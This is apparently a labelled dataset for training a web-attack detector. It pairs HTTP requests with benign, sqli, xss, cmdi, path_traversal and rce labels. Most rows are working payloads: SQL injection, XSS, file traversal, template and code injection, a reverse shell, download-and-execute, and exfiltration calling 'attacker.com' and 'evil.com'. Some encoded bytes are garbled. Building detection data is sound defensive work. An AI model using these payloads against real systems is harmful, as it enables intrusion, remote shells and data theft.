request_normalized,label
"GET /admin/run?input=| nslookup attacker.com HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /search?q=clothing&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=b9c8fb03ed14c022",benign
"GET /assets?path=....//....//etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /search?q='; EXEC xp_cmdshell('dir')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /search?q=xss""><img src=/ onerror=alert(2)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /profile?bio=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=& echo test > /tmp/pwned&submit=1",cmdi
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

input=../../../etc/passwd&submit=1",path_traversal
"GET /profile?bio=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"GET /search?q=1 OR 1=1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /assets?path=....\....\....\windows\system32\drivers\etc\hosts HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /api/items?name='; EXEC xp_cmdshell('dir')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /comment?text=<a href='javascript:alert(1)'>click me</a> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/products?category=camera&page=42&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

input={{lipsum.__globals__['os'].popen('id').read()}}&submit=1",rce
"GET /assets?path=/etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /feedback?msg=javascript:alert('XSS') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

input=${7*7}&submit=1",rce
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=bob_jones&email=admin@test.org&message=Hello World",benign
"GET /api/v2/orders?status=pending&user_id=148 HTTP/1.1
Host: api.example.com
Authorization: Bearer 25c23e756a84b4e87deace1dc363ca1e",benign
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<% Runtime.getRuntime().exec('id') %>&submit=1",rce
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=..\..\..\windows\win.ini&submit=1",path_traversal
"GET /eval?code=#{7*7} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<% Runtime.getRuntime().exec('id') %>&submit=1",rce
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=&& cat /etc/passwd&submit=1",cmdi
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=..\..\..\windows\win.ini&submit=1",path_traversal
"GET /tools/lookup?domain=| whoami HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /user?id=1' UNION SELECT null,username,password FROM users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"GET /download?file=����/����/etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /api/products?category=laptop&page=50&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

input=../../../etc/passwd&submit=1",path_traversal
"GET /news/article/breaking-news HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=system('id')&submit=1",rce
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

input=../etc/passwd&submit=1",path_traversal
"GET /comment?text=<iframe src='javascript:alert(1)'></iframe> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

input=<a href='javascript:alert(1)'>click me</a>&submit=1",xss
"GET /api/products?category=laptop&page=49&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=; ping -c 4 attacker.com&submit=1",cmdi
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 110

input=; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod x /tmp/shell.sh && /tmp/shell.sh&submit=1",cmdi
"GET /download?file=../////etc/////passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116

input={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}&submit=1",rce
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""alice_miller"",""password"":""c17e975a""}",benign
"GET /search?q=music&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=94e1bbf5f0013c1f",benign
"GET /api/ping?host=; python3 -c 'import socket;s=socket.socket();s.connect((""attacker.com"",4444));import os;os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system(""/bin/sh"")' HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=;assert(system('id'));&submit=1",rce
"GET /comment?text=<svg onload=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /template?expr=<?php system($_GET['cmd']); ?> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /api/ping?host=; ping -c 4 attacker.com HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /api/ping?host=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=; systeminfo&submit=1",cmdi
"GET /image?src=../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /search?q=admin' # HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 59

input=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>&submit=1",xss
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=' OR 1=1--&submit=1",sqli
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=bob_jones&email=admin@test.org&message=Hello World",benign
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

input=../../../etc/passwd&submit=1",path_traversal
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=[[${7*7}]]&submit=1",rce
"GET /template?expr={{config.__class__.__init__.__globals__['os'].popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /eval?code=<?php passthru('cat /etc/passwd'); ?> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /feedback?msg=<body onload=alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /calc?formula=exec('import os; os.system(""calc.exe"")') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /download?file=....\....\....\windows\system32\drivers\etc\hosts HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=& echo test > /tmp/pwned&submit=1",cmdi
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

input=../////etc/////passwd&submit=1",path_traversal
"GET /feedback?msg=<script>document.write('<img src=http://evil.com/' document.cookie '>')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /search?q=music&lang=en HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=e169d7dc56025eee",benign
"GET /products?filter=1' AND SLEEP(5)-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/process?data=eval(compile('import os; os.system(""id"")', 'string', 'exec')) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

input=' OR '1'='1&submit=1",sqli
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""jane_smith"",""password"":""e0be43e8""}",benign
"GET /feedback?msg=xss""><img src=/ onerror=alert(2)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /user?id=1 UNION SELECT user(),database(),version()-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

input=....\....\....\windows\system32\drivers\etc\hosts&submit=1",path_traversal
"GET /api/items?name=1 UNION SELECT user(),database(),version()-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /calc?formula={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /news/article/getting-started HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=..\..\..\windows\win.ini&submit=1",path_traversal
"GET /news/article/getting-started HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=<iframe src='javascript:alert(1)'></iframe>&submit=1",xss
"GET /tools/lookup?domain=1 && dir HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=../../../proc/self/environ&submit=1",path_traversal
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""john_doe"",""password"":""87c58e9d""}",benign
"GET /images/img_6292.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /api/ping?host=| curl http://attacker.com/$(whoami) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /api/items?name=' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""alice_miller"",""password"":""3b922267""}",benign
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"GET /products?filter=' OR ''=' HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /image?src=����/����/etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 52

input=<?php passthru('cat /etc/passwd'); ?>&submit=1",rce
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

input=| curl http://attacker.com/$(whoami)&submit=1",cmdi
"GET /eval?code=;assert(system('id')); HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

input=����/����/etc/passwd&submit=1",path_traversal
"GET /api/items?name=' OR '1'='1 HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /assets?path=../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /products?filter=1' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=| nslookup attacker.com&submit=1",cmdi
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

input=../../etc/passwd&submit=1",path_traversal
